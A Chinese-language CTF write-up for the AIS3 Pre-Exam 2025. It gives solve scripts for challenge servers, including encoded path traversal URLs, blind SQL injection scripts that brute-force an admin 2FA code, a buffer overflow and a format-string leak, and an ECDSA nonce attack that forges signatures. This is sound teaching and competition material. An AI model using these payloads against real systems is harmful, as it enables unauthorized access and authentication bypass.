---
title: "AIS3_Pre_Exam_2025_Writeups"
published: 2025-06-02T15:41:46.000Z
description: ""
tags: [Writeups, CTF, AIS3]
category: CTF
draft: false
---
# AIS3_Pre_Exam_2025 Writeups by owl_d

> Username: 松鼠醫生
> Score: 1200

## Web

### Tomorin db

直接去 /flag 會被 redirect 到影片去

```
http://chals1.ais3.org:30000/..%2fflag
```

就可以進到 /flag 頁面

---

### Login Screen 1

一開始先發現兩組帳密：
guest/guest, admin/admin
從 source code 可以看出 username 有 sqli

<!--more-->

先測測看 admin 的 2FA 長度

```python
import requests
import time

URL = "http://login-screen.ctftime.uk:36368/index.php"
PASSWORD = "guest"
MAX_LENGTH_TO_CHECK = 50 

found_length = 0

for length_to_guess in range(1, MAX_LENGTH_TO_CHECK + 1):
    payload = f"guest' AND (SELECT LENGTH(code) FROM users WHERE username='admin') = {length_to_guess} -- "
    data = {
        "username": payload,
        "password": PASSWORD
    }
    try:
        print(f"長度: {length_to_guess}", end='\r')
        r = requests.post(URL, data=data, timeout=10) # 無狀態的 requests.post，不然前面傳完後面就不用傳了
        if r.history:
            found_length = length_to_guess
            print(f"\n長度是: {found_length}")
            break
        else:
            time.sleep(0.05)

    except requests.exceptions.RequestException as e:
        print(f"\n連線錯誤: {e}")
        break
```

得到長度是 20
接下來可以一個一個去爆

```python
import requests
import string
import time

URL = "http://login-screen.ctftime.uk:36368/index.php"
CHARSET = string.digits 
PASSWORD = "guest"
result = ""

for i in range(1, 21):
    found_char = False
    for char in CHARSET:
        payload = f"guest' AND (SELECT SUBSTR(code, {i}, 1) FROM users WHERE username='admin') = '{char}' -- "
        data = {
            "username": payload,
            "password": PASSWORD
        }
        try:
            r = requests.post(URL, data=data, timeout=10)
            if r.history:
                result += char
                print(f"第 {i} 個字元: {char}")
                print(f"目前Ans: {result}")
                found_char = True
                break
            else:
                time.sleep(0.05)
        except requests.exceptions.RequestException as e:
            print(f"連線錯誤: {e}")
            exit(1)
    if not found_char:
        print(f"沒字元了")
        break
if result:
    print(f"\nSUCCESS")
    print(f"2FA Code: {result}")
else:
    print("\nFAIL")
```

得到 2FA 就可以進入 admin 的 dashboard 了

## PWN

### Welcome to the World of Ave Mujica🌙

目標：要跳到 shellcode 那邊，地址在 0x401256
漏洞1： main()函數裡有一個read可以做overflow
漏洞2： readint8()只檢查上界，不檢查負數 -> 只要打-1就可以變成255

Script (前半段來自 CryptoCat 的 pwn 影片教學腳本模板):

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x401347
continue
'''.format(**locals())

# Binary filename
exe = './chal'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
# EXPLOIT GOES HERE
# ===========================================================

io = start()

io.sendlineafter(b':', b'yes')

io.sendlineafter(b':', b'-1')

payload = b'A' * 160  
payload += b'B' * 8   
payload += p64(0x401256)  

payload = payload.ljust(255, b'C')

io.send(payload)

io.interactive()
```

### Format Number

漏洞點：

```cpp
char format[0x10] = {0};
printf("What format do you want ? ");
read(0, format, 0xf);
check_format(format);

char buffer[0x20] = {0};
strcpy(buffer, "Format number : %3$");
strcat(buffer, format);
strcat(buffer, "d\n");
printf(buffer, "Welcome", "~~~", number);
```

程序會讀取 flag 到 stack 上的 buf[256] 變數中。

```cpp
if (!isdigit(c) && !ispunct(c)) {
    printf("Error format !\n");
    exit(1);
}
```

check_format() 只允許數字和標點符號，過濾掉字母

所以用 `,%N$`的格式來繞過
當輸入 `,%15$` 時，最終的格式字符串變成：
"`Format number : %3$,%15$d\n`"
這樣 `%15$d` 就是一個有效的格式說明符，可以讀取第 15 個參數的值。

```python
#!/usr/bin/env python3
import socket
import re
import struct

def send_payload(host, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    s.send((payload + '\n').encode())
    response = s.recv(1024).decode()
    s.close()
    return response

def extract_number(output):
    match = re.search(r'Format number : %,(-?\d+)', output)
    if match:
        return int(match.group(1))
    match = re.search(r'Format number : (-?\d+)', output)
    if match:
        return int(match.group(1))
    return None

def int_to_ascii(value):
    if value < 0:
        value = value & 0xFFFFFFFF
    bytes_data = struct.pack('<I', value)
    ascii_str = ''
    for byte in bytes_data:
        if 32 <= byte <= 126:
            ascii_str += chr(byte)
    return ascii_str

def main():
    host = "chals1.ais3.org"
    port = 50960
  
    print("Test123")
  
    all_data = []
  
    for i in range(1, 200):
        try:
            payload = f",%{i}$"
            response = send_payload(host, port, payload)
            number = extract_number(response)
        
            if number is None:
                continue
            
            ascii_str = int_to_ascii(number)
            print(f"[{i:3d}] {number:12d} (0x{number & 0xFFFFFFFF:08x}) -> '{ascii_str}'")
        
            if ascii_str:
                all_data.append(ascii_str)
            
        except:
            continue
  
    if all_data:
        flag_string = ''.join(all_data)
        print(f"\nAll : {flag_string}")
    
        if 'AIS3{' in flag_string and '}' in flag_string:
            start = flag_string.find('AIS3{')
            end = flag_string.find('}', start) + 1
            flag = flag_string[start:end]
            print(f"\nFlag: {flag}")
        else:
            print("\nSearching for flag pattern in output...")
            for i, data in enumerate(all_data):
                if 'AIS3' in data or '{' in data or '}' in data:
                    print(f"Flag part found: '{data}' at position {i+1}")

if __name__ == "__main__":
    main()
```

![image](https://hackmd.io/_uploads/r1ENC09Mee.png)

## misc

### Ramen CTF

掃一下發票就有了
![image](https://hackmd.io/_uploads/HkVITacGex.png)

### AIS3 Tiny Server - Web / Misc

題目有給線索要進到/proc，
推測跟path traversal有關
一開始用../會被擋掉
編碼過後就可以順利進入

```
http://chals1.ais3.org:20872/..%2f..%2f..%2fproc
```

![image](https://hackmd.io/_uploads/ByA7OAcGlx.png)
![image](https://hackmd.io/_uploads/SJlBOAcfgg.png)

### Welcome

視力：100%
照著打就有了

## Crypto

### Hill

這題提供了一個 Python 加密程式 (chall.py)。它的核心運作方式如下：
隨機金鑰：

* 程式會產生兩個 8×8 的數字矩陣，我們稱它們為 A 和 B。這些矩陣中的數字都是小於 251 的整數。
* 這兩個矩陣 A 和 B 就是加密用的「金鑰」，並且它們在模 251 的情況下都是「可逆的」（也就是說可以找到它們的反矩陣）。

加密方式：

* 首先，程式會把你輸入的文字（例如 FLAG）轉換成數字，然後切成一塊一塊的，每一塊包含 8 個數字（代表 8 個字元）。我們把這些文字塊叫做 P0,P1,P2,…。
* 第一塊文字 P0 的加密方式是：

  * C0=(P0⋅A)(mod251)
    這裡的 P0 是一個包含 8 個數字的橫列， A 是 8×8 的金鑰矩陣，C0 是加密後的結果，也是一個包含 8 個數字的橫列。所有的計算結果都要對 251 取餘數。
* 後面的文字塊 Pi （當 i>0）的加密方式是：

  * Ci=(Pi⋅A+Pi−1⋅B)(mod251)
    除了用當前的文字塊 Pi 和金鑰 A 之外，還會用到前一塊原始文字 Pi−1 和金鑰 B。

漏洞：

* 伺服器一開始會用它秘密生成的 A 和 B 把 FLAG 加密後顯示給你看。
* 接著，它會讓你輸入任何你想要的文字。伺服器會用同一組金鑰 A 和 B 來加密你輸入的文字，然後把加密結果顯示給你看。
* 這就是一個典型的「選擇明文攻擊 (Chosen-Plaintext Attack)」機會。因為我們可以自己設計輸入的「明文」，觀察加密後的「密文」，藉此推敲出秘密金鑰。

```python
import numpy as np
from pwn import *

HOST = 'chals1.ais3.org'
PORT = 18000
P_MOD = 251
N_DIM = 8

def get_modular_inverse(num, modulus):
    if modulus == 1:
        return 0
    m0, y, x = modulus, 0, 1
    num = num % modulus
    while num > 1:
        q = num // modulus
        modulus, num = num % modulus, modulus
        y, x = x - q * y, y
    if x < 0:
        x = x + m0
    return x

def find_matrix_inverse_mod_p(matrix_to_invert, modulus):
    matrix_copy = np.array(matrix_to_invert, dtype=int)
    identity_tracker = np.identity(N_DIM, dtype=int)

    for i in range(N_DIM):
        pivot = matrix_copy[i, i]
        if pivot == 0:
            pivot_found_in_column = False
            for k in range(i + 1, N_DIM):
                if matrix_copy[k, i] != 0:
                    matrix_copy[[i, k]] = matrix_copy[[k, i]].copy()
                    identity_tracker[[i, k]] = identity_tracker[[k, i]].copy()
                    pivot = matrix_copy[i, i]
                    pivot_found_in_column = True
                    break
            if not pivot_found_in_column:
                raise ValueError("矩陣不可逆。")

        inv_pivot_val = get_modular_inverse(pivot, modulus)
    
        matrix_copy[i, :] = (matrix_copy[i, :] * inv_pivot_val) % modulus
        identity_tracker[i, :] = (identity_tracker[i, :] * inv_pivot_val) % modulus

        for j in range(N_DIM):
            if i != j:
                factor_to_eliminate = matrix_copy[j, i]
                matrix_copy[j, :] = (matrix_copy[j, :] - factor_to_eliminate * matrix_copy[i, :]) % modulus
                identity_tracker[j, :] = (identity_tracker[j, :] - factor_to_eliminate * identity_tracker[i, :]) % modulus
  
    return identity_tracker

crafted_input_blocks = np.zeros((2 * N_DIM, N_DIM), dtype=int)
identity_matrix_base = np.identity(N_DIM, dtype=int)
for i in range(N_DIM):
    crafted_input_blocks[2 * i] = identity_matrix_base[i]

bytes_to_send = crafted_input_blocks.flatten().astype(np.uint8).tobytes()

log.info("開始連線")
connection = remote(HOST, PORT)

connection.recvuntil(b'Encrypted flag:\n')
raw_flag_ciphertext = connection.recvuntil(b'\ninput:', drop=True).strip()

parsed_flag_c_blocks = []
for line_bytes in raw_flag_ciphertext.split(b'\n'):
    numbers_str = line_bytes.replace(b'[', b'').replace(b']', b'')
    numbers = [int(x) for x in numbers_str.split()]
    parsed_flag_c_blocks.append(numbers)
flag_cipher_matrix = np.array(parsed_flag_c_blocks, dtype=int)

connection.sendline(bytes_to_send)
raw_response_ciphertext = connection.recvall().strip()
connection.close()

if not raw_response_ciphertext:
    log.error("伺服器沒回傳")
    exit()

parsed_response_c_blocks = []
for line_bytes in raw_response_ciphertext.split(b'\n'):
    if line_bytes.strip():
        numbers_str = line_bytes.replace(b'[', b'').replace(b']', b'')
        numbers = [int(x) for x in numbers_str.split()]
        parsed_response_c_blocks.append(numbers)
response_cipher_matrix = np.array(parsed_response_c_blocks, dtype=int)
log.success("成功1")

log.info("金鑰 A 和 B 反推")
key_A = np.zeros((N_DIM, N_DIM), dtype=int)
key_B = np.zeros((N_DIM, N_DIM), dtype=int)

for i in range(N_DIM):
    key_A[i] = response_cipher_matrix[2 * i]
    key_B[i] = response_cipher_matrix[2 * i + 1]
log.success("成功2")

log.info("解密")
key_A_inverse = find_matrix_inverse_mod_p(key_A, P_MOD)

num_of_flag_blocks = flag_cipher_matrix.shape[0]
decrypted_flag_blocks_matrix = np.zeros((num_of_flag_blocks, N_DIM), dtype=int)

first_decrypted_block = (flag_cipher_matrix[0] @ key_A_inverse) % P_MOD
decrypted_flag_blocks_matrix[0] = first_decrypted_block

for i in range(1, num_of_flag_blocks):
    previous_decrypted_block = decrypted_flag_blocks_matrix[i - 1]
    intermediate_calc = (flag_cipher_matrix[i] - (previous_decrypted_block @ key_B)) % P_MOD
    current_decrypted_block = (intermediate_calc @ key_A_inverse) % P_MOD
    decrypted_flag_blocks_matrix[i] = current_decrypted_block

final_decrypted_bytes = decrypted_flag_blocks_matrix.flatten().astype(np.uint8).tobytes()
flag_result = final_decrypted_bytes.rstrip(b'\x00').decode('ascii', errors='ignore')

log.success(f"成功3")
print("\n" + "="*50)
print(f"FLAG: {flag_result}")
print("="*50)

```

### Random_RSA

這題 RSA 的核心在於其質數 p 和 q 的生成方式。它們並非隨機產生，而是透過一個線性同餘生成器 (LCG) rng(x) = (a*x + b) % M 來逐步迭代產生。雖然 LCG 的參數 a 和 b 未知，但題目提供了 LCG 的模數 M 以及三個連續的 LCG 輸出 h0, h1, h2。我們的目標就是利用這些資訊來破解 LCG，找出 p 和 q，最終解密旗幟。

💡 破解 LCG
LCG 的關係式如下：

* h1 = (a*h0 + b) % M
* h2 = (a*h1 + b) % M

這是一個模 M 下的二元一次聯立方程式。透過簡單的代數運算：

* 兩式相減：h2 - h1 = a * (h1 - h0) % M
* 解出 a：a = ((h2 - h1) * pow(h1 - h0, -1, M)) % M
* 代回解出 b：b = (h1 - a * h0) % M

這樣我們就能完整還原 LCG 的參數 a 和 b。

💡 尋找 RSA 質數 (p, q)
題目中 q 是以 p 為種子，透過 LCG 生成的第一個質數。這代表 q 可以表示成 LCG 對 p 迭代 k 次的結果，即 q = LCG^k(p)。
更精確地說，q 是序列 rng(p), rng(rng(p)), ... 中的第 k 個數，且該數為質數，同時前面的 k-1 個數都不是質數。
這個關係可以寫成 q = (A_k * p + B_k) % M，其中 A_k = pow(a, k, M) 且 B_k = (b * (A_k - 1) * pow(a - 1, -1, M)) % M。
結合 n = p * q，我們可以得到一個關於 p 的二次同餘方程式：

* A_k * p^2 + B_k * p - (n % M) == 0 (mod M)

我們只需迭代嘗試較小的 k 值 (例如 1 到 20)。對於每個 k：

* 計算 A_k 和 B_k。
* 求解上述二次同餘方程式，得到 p_mod_M 的候選值。這需要計算模平方根。
* 由於 p 和 M 的位元長度相近 (512位元)，實際的 p 很可能就是 p_mod_M。
* 驗證 p_mod_M 是否能整除 n。若可以，則 p = p_mod_M 且 q = n // p。
* 最後，確認 p 和 q 都是質數，並且 q 確實是從 p 開始經由 LCG 迭代 k 次所得到的第一個質數。

實驗發現，當 k=7 時，可以成功找到 p 和 q。

```python
from Crypto.Util.number import long_to_bytes, isPrime

def legendre_symbol(a, p):
    ls = pow(a, (p - 1) // 2, p)
    if ls == p - 1:
        return -1
    return ls

def sqrt_mod(n, p):
    n %= p
    if legendre_symbol(n, p) != 1:
        return None
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)

    q_val = p - 1
    s_val = 0
    while q_val % 2 == 0:
        s_val += 1
        q_val //= 2
  
    z = 2
    while legendre_symbol(z, p) != -1:
        z += 1
  
    m_val = s_val
    c_val = pow(z, q_val, p)
    t_val = pow(n, q_val, p)
    r_val = pow(n, (q_val + 1) // 2, p)

    while t_val != 1:
        if t_val == 0:
            return 0
        i = 0
        temp_t = t_val
        while temp_t != 1:
            temp_t = (temp_t * temp_t) % p
            i += 1
            if i == m_val:
                return None
    
        power = pow(2, m_val - i - 1)
        b_val = pow(c_val, power, p)
        m_val = i
        c_val = (b_val * b_val) % p
        t_val = (t_val * c_val) % p
        r_val = (r_val * b_val) % p
    return r_val

h0 = 2907912348071002191916245879840138889735709943414364520299382570212475664973498303148546601830195365671249713744375530648664437471280487562574592742821690
h1 = 5219570204284812488215277869168835724665994479829252933074016962454040118179380992102083718110805995679305993644383407142033253210536471262305016949439530
h2 = 3292606373174558349287781108411342893927327001084431632082705949610494115057392108919491335943021485430670111202762563173412601653218383334610469707428133
M = 9231171733756340601102386102178805385032208002575584733589531876659696378543482750405667840001558314787877405189256038508646253285323713104862940427630413
n = 20599328129696557262047878791381948558434171582567106509135896622660091263897671968886564055848784308773908202882811211530677559955287850926392376242847620181251966209002883852930899738618123390979377039185898110068266682754465191146100237798667746852667232289994907159051427785452874737675171674258299307283
e_val = 65537
c_val = 13859390954352613778444691258524799427895807939215664222534371322785849647150841939259007179911957028718342213945366615973766496138577038137962897225994312647648726884239479937355956566905812379283663291111623700888920153030620598532015934309793660829874240157367798084893920288420608811714295381459127830201

h1_minus_h0 = (h1 - h0) % M
inv_h1_minus_h0 = pow(h1_minus_h0, -1, M)
a_lcg = ((h2 - h1) * inv_h1_minus_h0) % M
b_lcg = (h1 - (a_lcg * h0)) % M

print(f"Recovered LCG params: a = {a_lcg}, b = {b_lcg}")

def rng(x):
    return (a_lcg * x + b_lcg) % M

p_rsa, q_rsa = 0, 0
max_k = 20

for k_iter in range(1, max_k + 1):
    A_k = pow(a_lcg, k_iter, M)
    inv_a_minus_1 = pow(a_lcg - 1, -1, M)
    B_k = (b_lcg * (A_k - 1) * inv_a_minus_1) % M

    n_mod_M = n % M
    discriminant = (pow(B_k, 2, M) + 4 * A_k * n_mod_M) % M

    if legendre_symbol(discriminant, M) != 1:
        continue

    s_sqrt = sqrt_mod(discriminant, M)
    if s_sqrt is None:
        continue
  
    inv_2A_k = pow(2 * A_k, -1, M)
    p1_mod_M = ((-B_k + s_sqrt) * inv_2A_k) % M
    p2_mod_M = ((-B_k - s_sqrt) * inv_2A_k) % M # (-B_k - s + M) * inv % M

    for p_cand in [p1_mod_M, p2_mod_M]:
        if p_cand == 0:
            continue
    
        if n % p_cand == 0:
            p_found = p_cand
            q_found = n // p_cand
        
            if isPrime(p_found) and isPrime(q_found):
                val_check = p_found
                is_q_correct = False
                for i_check in range(1, k_iter + 1):
                    val_check = rng(val_check)
                    if i_check < k_iter and isPrime(val_check):
                        is_q_correct = False
                        break
                    if i_check == k_iter:
                        if isPrime(val_check) and val_check == q_found:
                            is_q_correct = True
            
                if is_q_correct:
                    p_rsa = p_found
                    q_rsa = q_found
                    break
    if p_rsa != 0:
        print(f"Found p and q at k = {k_iter}")
        break

if p_rsa == 0 or q_rsa == 0:
    print("Failed to find p and q.")
else:
    print(f"Found Factors: p = {p_rsa}, q = {q_rsa}")
    phi = (p_rsa - 1) * (q_rsa - 1)
    d_rsa = pow(e_val, -1, phi)
    m_int = pow(c_val, d_rsa, n)
  
    try:
        flag = long_to_bytes(m_int)
        print(f"FLAG: {flag.decode()}")
    except Exception as e:
        print(f"Failed to decode flag: {e}")
```

### SlowECDSA

💡 漏洞分析：可預測的 Nonce (k)
ECDSA 簽章的安全性極度依賴一個稱為 nonce 或 k 的隨機數。如果這個 k 值可以被預測、重複使用，或者不同簽章間的 k 值存在特定關聯，那麼私鑰就有洩漏的風險。
仔細觀察 chal.py，我們發現 k 值是由一個線性同餘生成器 (LCG) 所產生：

* lcg = LCG(seed=..., a=1103515245, c=12345, m=order)
* k = lcg.next()

LCG 的公式是 X_{n+1} = (a * X_n + c) % m。在這個情境下：

* m 是橢圓曲線的階 order (已知)。
* a (1103515245) 和 c (12345) 是 LCG 的常數 (已知)。
* 初始種子 seed (即 X_0) 是未知的，但這不影響我們的攻擊，因為我們關心的是連續 k 值之間的關係。

關鍵在於，如果我們連續請求兩次簽章，得到的兩個 k 值 (稱作 k_1 和 k_2) 會滿足 k_2 = (a * k_1 + c) % order。這個已知的線性關係就是我們的突破口。

💡 攻擊思路：解出私鑰
ECDSA 簽章的公式為 s = k^{-1} * (h + r * sk) % order，其中 sk 是私鑰，h 是訊息的雜湊值。
我們可以把它改寫成 k = s^{-1} * (h + r * sk) % order。
現在我們有：

* k_1 = s_1^{-1} * (h + r_1 * sk) % order
* k_2 = s_2^{-1} * (h + r_2 * sk) % order
* k_2 = (a * k_1 + c) % order

將 (1) 和 (2) 代入 (3)：

* s_2^{-1} * (h + r_2 * sk) = (a * (s_1^{-1} * (h + r_1 * sk)) + c) % order

在這個方程式中，h (因為我們連續請求的是同一個 example_msg 的簽章，所以雜湊值相同)、r_1, s_1, r_2, s_2, a, c, order 全部都是已知數。唯一未知的就是私鑰 sk！
透過一些代數運算，我們就能把 sk 給解出來。
一旦獲得私鑰 sk，我們就能偽造任何訊息的簽章，包括題目要求的 "give_me_flag"。

💡 解題步驟

1. 取得樣本簽章：向伺服器連續呼叫 get_example 兩次，獲得對 example_msg 的兩組簽章 (r_1, s_1) 和 (r_2, s_2)。
2. 計算私鑰：利用上述推導的公式，結合已知的 LCG 參數 a 和 c，以及兩組簽章，計算出私鑰 sk。
3. 偽造目標簽章：
   計算訊息 "give_me_flag" 的 SHA-1 雜湊值，得到 h_flag。
   隨意選擇一個 k 值 (例如 k=12345)。
   使用算出的私鑰 sk 和選擇的 k，根據 ECDSA 公式計算出 give_me_flag 的簽章 (r_flag, s_flag)。
4. 提交驗證：將偽造的簽章 (r_flag, s_flag) 和訊息 "give_me_flag" 傳送給伺服器的 verify 功能。
5. 取得 Flag：如果簽章正確，伺服器就會把 Flag 給我們。

```python
 #!/usr/bin/env python3

import hashlib
from pwn import *
from ecdsa import NIST192p
from ecdsa.util import number_to_string, string_to_number 
from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse 

# --- 題目給的參數 ---
curve = NIST192p
order = curve.generator.order()
lcg_a = 1103515245
lcg_c = 12345
example_msg_bytes = b"example_msg"

# --- 連線設定 ---
HOST, PORT = "chals1.ais3.org", 19000
conn = remote(HOST, PORT)
# conn = process(['python3', 'chal.py']) # 本地測試

def get_server_signature():
    conn.sendlineafter(b"Enter option: ", b"get_example")
    conn.recvuntil(b"r: ")
    r_hex = conn.recvline().strip()
    conn.recvuntil(b"s: ")
    s_hex = conn.recvline().strip()
    return int(r_hex, 16), int(s_hex, 16)

def submit_for_verification(message_str, r_val, s_val):
    conn.sendlineafter(b"Enter option: ", b"verify")
    conn.sendlineafter(b"Enter message: ", message_str.encode())
    conn.sendlineafter(b"Enter r (hex): ", hex(r_val).encode())
    conn.sendlineafter(b"Enter s (hex): ", hex(s_val).encode())
    response = conn.recvall(timeout=2) # 等待伺服器回應
    return response.decode()

print("[+] 開始攻擊")

print("第一組簽章")
r1, s1 = get_server_signature()
print(f"    r1: {hex(r1)}")
print(f"    s1: {hex(s1)}")

print("第二組簽章")
r2, s2 = get_server_signature()
print(f"    r2: {hex(r2)}")
print(f"    s2: {hex(s2)}")

# 計算 example_msg 的雜湊值
h_example = bytes_to_long(hashlib.sha1(example_msg_bytes).digest())

# k1 = s1_inv * (h + r1 * sk)
# k2 = s2_inv * (h + r2 * sk)
# k2 = (a * k1 + c)
# s2_inv * (h + r2 * sk) = a * (s1_inv * (h + r1 * sk)) + c
# s2_inv*h + s2_inv*r2*sk = a*s1_inv*h + a*s1_inv*r1*sk + c
# sk * (s2_inv*r2 - a*s1_inv*r1) = a*s1_inv*h - s2_inv*h + c
# sk * (s2_inv*r2 - a*s1_inv*r1) = h*(a*s1_inv - s2_inv) + c
# sk = (h*(a*s1_inv - s2_inv) + c) * inv(s2_inv*r2 - a*s1_inv*r1)

s1_inv = inverse(s1, order)
s2_inv = inverse(s2, order)

# sk = (h_example * (lcg_a * s1_inv - s2_inv) + lcg_c) * inverse(s2_inv * r2 - lcg_a * s1_inv * r1, order) % order
# 整理一下公式
# (s2_inv * (h + r2*sk)) = (lcg_a * (s1_inv * (h + r1*sk)) + lcg_c)
# s2_inv*h + s2_inv*r2*sk = lcg_a*s1_inv*h + lcg_a*s1_inv*r1*sk + lcg_c
# sk * (s2_inv*r2 - lcg_a*s1_inv*r1) = lcg_a*s1_inv*h - s2_inv*h + lcg_c
# sk * (s2_inv*r2 - lcg_a*s1_inv*r1) = h * (lcg_a*s1_inv - s2_inv) + lcg_c
# sk = (h_example * (lcg_a * s1_inv - s2_inv) + lcg_c) * inverse(s2_inv * r2 - lcg_a * s1_inv * r1, order)

term_A = (h_example * (lcg_a * s1_inv - s2_inv) + lcg_c) % order
term_B_inv = inverse( (s2_inv * r2 - lcg_a * s1_inv * r1) % order , order)

private_key = (term_A * term_B_inv) % order
print(f"成功計算出私鑰 sk: {hex(private_key)}")

# 用算出來的私鑰來簽 "give_me_flag"
target_message = "give_me_flag"
h_flag = bytes_to_long(hashlib.sha1(target_message.encode()).digest())

# 隨便選一個 k，只要不是 0 或 order 的倍數就好
k_exploit = 666 

P_exploit = k_exploit * curve.generator
r_exploit = P_exploit.x() % order

if r_exploit == 0:
    print("r_exploit = 0，換一個 k 再試一次")
    exit()

k_exploit_inv = inverse(k_exploit, order)
s_exploit = (k_exploit_inv * (h_flag + r_exploit * private_key)) % order

if s_exploit == 0:
    print("s_exploit 為 0，換一個 k 再試一次")
    exit()

print(f"已偽造 '{target_message}' 的簽章:")
print(f"    r: {hex(r_exploit)}")
print(f"    s: {hex(s_exploit)}")

print("將偽造簽章傳送到伺服器")
result = submit_for_verification(target_message, r_exploit, s_exploit)

print("\n伺服器回應:")
print(result)

conn.close()

```

## Reverse

### web flag checker

網站原始碼有幾行比較有趣的內容

```javascript
67940: ($0) => { const val = document.getElementById('flagInput').value; stringToUTF8(val, $0, 64); }
68027: ($0) => { document.getElementById('result').textContent = $0 ? 'Success' : 'Wrong flag'; }
```

Exported functions:

* _flagchecker(1) - 主要的flag檢查function
* _on_check(3) - Click event handler
* _main(2) - Main entry point

WebAssembly:

```javascript
function findWasmBinary() {
    return locateFile('index.wasm');
}
```

把index.js轉成index.wasm後可以發現：

```wasm
(local.set $l23 (call $f13 (local.get $l22)))  ; strlen函数
(local.set $l24 (i32.const 40))                ; 檢查長度40
(local.set $l25 (i32.ne (local.get $l23) (local.get $l24)))  ; 比較長度
```

還有

```
(local.set $l12 (i64.const 7577352992956835434))   ; 期望值1
(local.set $l13 (i64.const 7148661717033493303))   ; 期望值2  
(local.set $l14 (i64.const -7081446828746089091))  ; 期望值3
(local.set $l15 (i64.const -7479441386887439825))  ; 期望值4
(local.set $l16 (i64.const 8046961146294847270))   ; 期望值5

```

使用固定密鑰：-39934163 (0xFDA0E2ED)
驗證循環（5次迭代）：

* 提取8字節：從輸入字符串中取出8字節數據
* 計算移位量：shift = (key >> (i * 6)) & 63
* 對於每次迭代i（0-4），從密鑰中提取6位作為移位量
* 循環左移：使用函數f8對8字節數據進行循環左移
* 比較：將變換後的結果與對應的期望值比較

```python
def ror64(value, shift):
    value = value & 0xFFFFFFFFFFFFFFFF  
    shift = shift % 64
    return ((value >> shift) | (value << (64 - shift))) & 0xFFFFFFFFFFFFFFFF

def solve_flag():
    expected_values = [
        7577352992956835434,   # 0x6927A7A7A7A7A76A
        7148661717033493303,   # 0x6327A7A7A7A7A737
        -7081446828746089091, 
        -7479441386887439825,  
        8046961146294847270    # 0x6F27A7A7A7A7A726
    ]
  
    # 將負數轉換為無符號64位
    for i in range(len(expected_values)):
        if expected_values[i] < 0:
            expected_values[i] = expected_values[i] + (1 << 64)
  
    key = -39934163 & 0xFFFFFFFF  # 0xFDA0E2ED
  
    flag_parts = []
    for i in range(5):
        shift = (key >> (i * 6)) & 63
        original = ror64(expected_values[i], shift)
        flag_parts.append(original.to_bytes(8, 'little'))
  
    return b''.join(flag_parts)

flag = solve_flag()
print(f"Flag: {flag}")
print(f"Flag (hex): {flag.hex()}")

```

### AIS3 Tiny Server - Reverse

IDA分析完之後有幾個比較關鍵的functions:

* sub_2110:
  這個函式負責讀取並解析 HTTP 請求。它會解析請求的方法、路徑以及標頭。
  其中，它會特別檢查一個名為 Authorization: rikki 的 HTTP 標頭。
  如果找到這個標頭，它會將後面的值與 sub_1E20 函式的回傳值進行比對。
* sub_1E20:
  這一題的關鍵。包含一個加密/解密的邏輯，用來驗證傳入的 flag 是否正確。
  函式內部有一個 rikki_l0v3 的字串和一個固定的 byte array，透過 XOR 運算來產生正確的 flag。

![image](https://hackmd.io/_uploads/HktqUR5fll.png)

我們自己對著v8的內容去做XOR就可以得到flag

```py
import struct

def solve_flag():
  
    dword_array = [
        1480073267, 1197221906, 254628393, 920154, 1343445007,
        874076697, 1127428440, 1510228243, 743978009, 54940467,
        1246382110
    ]
  
    # 最後一個 byte 來自 v9 = 20
    last_byte = 20

    encrypted_data = b''
    for d in dword_array:
        # '<I' 表示小端序 (little-endian) 的 unsigned int
        encrypted_data += struct.pack('<I', d)
  
    encrypted_data += struct.pack('<B', last_byte)

    key = b"rikki_l0v3"
  
    flag = bytearray()
  
    v2 = 51

    for i in range(45):
        key_char = key[i % len(key)]
        decrypted_byte = v2 ^ key_char
        flag.append(decrypted_byte)
        if i < 44:
            v2 = encrypted_data[i + 1]
    return flag.decode('utf-8')

if __name__ == "__main__":
    generated_flag = solve_flag()
    print(f"Flag: {generated_flag}")
```

![image](https://hackmd.io/_uploads/H12RBAcfex.png)
